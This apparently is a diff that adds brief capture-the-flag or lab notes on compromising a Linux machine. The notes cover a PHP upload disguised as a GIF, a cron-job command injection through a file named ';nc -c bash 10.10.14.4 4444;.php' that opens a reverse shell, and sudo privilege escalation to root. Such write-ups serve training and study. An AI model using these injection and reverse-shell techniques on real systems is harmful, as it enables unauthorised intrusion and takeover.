@@ -1,0 +1,25 @@
+OS:
+- Linux
+
+Open Ports:
+- 22
+- 80
+
+
+Directories:
+- /backup
+
+- found backup of all php files
+- found upload page
+- uploaded php script masked a gif
+- got reverse shell
+- reviewed script that runs on cronjob
+- references filename for php system cmd
+- created file with ;nc -c bash 10.10.14.4 4444;.php
+- got reverse shell as user: guly
+- checking sudo -l
+- can run a script that is supposed to change interface names as root
+- accepts user input to file
+- added space in file and then added bash
+- got root shell
+
